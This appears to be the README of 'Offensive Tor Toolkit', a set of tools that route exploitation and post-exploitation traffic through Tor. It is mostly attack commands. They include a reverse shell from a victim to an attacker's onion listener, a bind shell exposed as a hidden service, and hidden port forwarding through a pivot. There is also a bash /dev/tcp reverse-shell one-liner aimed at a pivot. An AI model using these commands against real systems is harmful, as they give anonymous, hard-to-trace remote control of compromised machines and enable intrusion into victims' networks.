# Offensive Tor Toolkit
**Offensive Tor Toolkit** is a series of tools that simplify the use of Tor for typical **exploitation and post-exploitation tasks**.

In exploitation and post-exploitation phases, the victim needs to access Tor. All of this tools have an **embedded instance of Tor** and they are completely separated from each other. In this way, you only need to upload one file to the victim in order to run the required action.

Please, read the [**docs**](https://atorrescogollo.github.io/geekdoc/projects/offensive-tor-toolkit/) for more information.

## TL;DR
```bash
git clone https://github.com/atorrescogollo/offensive-tor-toolkit.git
cd offensive-tor-toolkit
docker build -t offensive-tor-toolkit .
docker run -v $(pwd)/dist/:/dist/ -it --rm offensive-tor-toolkit
```
### Reverse Shell over Tor
* **Attacker**
```bash
$ grep '^HiddenServicePort' /etc/tor/torrc
HiddenServicePort 4444 127.0.0.1:4444
$ nc -lvnp 4444
```
* **Victim**
```bash
$ ./reverse-shell-over-tor -listener m5et..jyd.onion:4444
```

### Bind Shell over Tor
* **Victim**
```bash
$ ./hidden-bind-shell -data-dir /tmp/datadir/ -hiddensrvport 1234
...
Bind shell is listening on hgnzi...g6yew.onion:1234
```
* **Attacker**
```bash
$ alias nctor='nc --proxy 127.0.0.1:9050 --proxy-type socks5'
$ nctor -v hgnzi...g6yew.onion 1234
```

### Hidden Port Forwarding
* **Victim/Pivot**
```
$ ./hidden-portforwarding -data-dir /tmp/pf-datadir -forward 127.0.0.1:1111 -hidden-port 9001
...
Forwarding xa7l...a4el.onion:9001 -> 127.0.0.1:8080
```
* **Attacker**
```bash
$ alias curltor="curl --socks5-hostname 127.0.0.1:9050"
$ curltor http://xa7l...a4el.onion:9001/
```

### TCP2Tor Proxy
* **Attacker**
```bash
$ grep '^HiddenServicePort' /etc/tor/torrc
HiddenServicePort 4444 127.0.0.1:4444
$ nc -lvnp 4444
```
* **Pivot**
```
$ ./tcp2tor-proxy -listen 0.0.0.0:60101 -onion-forward m5et..jyd.onion:4444
...
Proxying 0.0.0.0:60101 -> m5et..jyd.onion:4444
```
* **Victim**
```
$ bash -i >& /dev/tcp/<PIVOT_IP>/60101 0>&1
```
